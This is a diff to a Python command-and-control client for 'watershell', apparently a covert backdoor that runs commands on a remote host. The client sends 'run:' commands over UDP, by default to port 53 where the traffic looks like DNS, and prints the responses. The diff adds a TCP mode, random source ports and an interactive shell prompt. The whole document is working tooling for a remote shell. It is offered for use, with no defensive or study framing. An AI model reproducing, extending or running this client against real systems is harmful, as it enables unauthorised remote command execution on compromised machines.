@@ -12,6 +12,7 @@ import argparse
 import socket
 import time
 import sys
+import random
 
 def recv_timeout(the_socket, timeout=4):
     """
@@ -68,16 +69,25 @@ def declare_args():
         help="IP of the target to send UDP message to.")
 
     parser.add_argument(
+        '-T', '--tcp',
+        dest='tcp_bool',
+        action='store_true',
+        required=False,
+        help="Use TCP or default to UDP. (experimental)")
+
+    parser.add_argument(
         '-p', '--port',
         dest='port',
         type=int,
         default=53,
         help="Port to send UDP message to.")
+
     parser.add_argument(
         '-c', '--command',
         dest='command',
         type=str,
         help="One off command to send to listening watershell target")
+
     parser.add_argument(
         '-i', '--interactive',
         dest='interactive',
@@ -87,18 +97,24 @@ def declare_args():
 
     return parser
 
-def execute_cmd_prompt(sock, target):
+def execute_cmd_prompt(sock, target, tcp_bool):
     """
     Interactively prompt user for commands and execute them
     """
+    if tcp_bool:
+        sock.connect(target)
+
     while True:
         cmd = input("//\\\\watershell//\\\\>> ")
         if cmd == 'exit':
             break
         if len(cmd) > 1:
-            sock.sendto(("run:"+cmd).encode(), target)
-            resp = recv_timeout(sock, 4)
-            print(resp)
+            if not tcp_bool:
+                sock.sendto(("run:"+cmd).encode(), target)
+                resp = recv_timeout(sock, 4)
+                print(resp)
+            else:
+                sock.send(("run:"+cmd).encode())
 
 def main():
     """
@@ -107,27 +123,40 @@ def main():
     """
     args = declare_args().parse_args()
 
+
     # Bind source port to send UDP message from
-    s_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s_socket.bind(("0.0.0.0", 53316))
+    # tcp has no response.
+    if not args.tcp_bool:
+        src_port = random.randint(40000, 65353)
+        s_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s_socket.bind(("0.0.0.0", src_port))
+    else:
+        s_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
 
     target = (args.target, args.port)
     print("Connecting to Watershell on {}...".format(target))
-    s_socket.sendto(b'status:', target)
+    if not args.tcp_bool:
+        s_socket.sendto(b'status:', target)
 
-    resp = recv_timeout(s_socket, 2)
-    if resp == "up":
-        print("Connected!")
-    else:
-        print("Connection Failed...")
-        sys.exit(1)
+        resp = recv_timeout(s_socket, 2)
+        if resp == "up":
+            print("Connected!")
+        else:
+            print("Connection Failed...")
+            sys.exit(1)
 
-    if args.interactive:
-        execute_cmd_prompt(s_socket, target)
+    if args.interactive and not args.command:
+        execute_cmd_prompt(s_socket, target, args.tcp_bool)
     else:
-        s_socket.sendto(("run:{}".format(args.command)).encode(), target)
-        resp = recv_timeout(s_socket, 4)
-        print(resp)
+        if not args.tcp_bool:
+            s_socket.sendto(("run:{}".format(args.command)).encode(), target)
+            resp = recv_timeout(s_socket, 4)
+            print(resp)
+        else:
+            s_socket.connect(target)
+            s_socket.send(("run:{}".format(args.command)).encode())
+
 
 if __name__ == '__main__':
     main()
